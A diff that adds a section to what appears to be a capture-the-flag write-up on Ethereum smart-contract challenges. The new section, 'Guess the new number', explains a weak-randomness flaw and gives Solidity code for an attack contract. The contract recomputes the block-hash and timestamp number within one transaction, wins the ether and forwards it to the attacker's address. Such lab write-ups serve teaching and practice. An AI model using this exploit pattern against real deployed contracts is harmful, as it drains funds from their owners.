@@ -36,3 +36,31 @@ We need to find the number saved during the creation of the contract. Since the 
 answer = int(w3.eth.get_storage_at(contract_address, 0).hex(), base=16)
 ```
 Then we send the transcation like the previous challenge.
+
+## 6) Guess the new number
+
+Similar to the previous challenges, we need to find the right number, only now, the number is generated at the same time we are trying to guess it.
+```solidity
+uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+```
+
+To guess this number, we create an attack contract that will do the same calculation as the target contract and will then "guess" the correct answer. Since the calculations are done during the same transaction, they will have the same block.number and timestamp:
+```solidity
+uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+GuessTheNewNumber(target_contract).guess{value: msg.value}(answer);
+payable(msg.sender).transfer(address(this).balance);
+```
+We need to slightly modify the syntax since we are using solidity version 0.8.0 so `now` becomes `block.timestamp` and `keccak(x,y)` become `keccak256(abi.encodePacked(x,y))`
+Then our `attack()` function call the `guess()` function with a `msg.value` of `1 ether` and we then transfer the received ether to our EOA attacker address. We also need to make sure our attack contract has a `receive()` function to receive the ether from the target contract:
+```solidity
+receive() external payable {}
+```
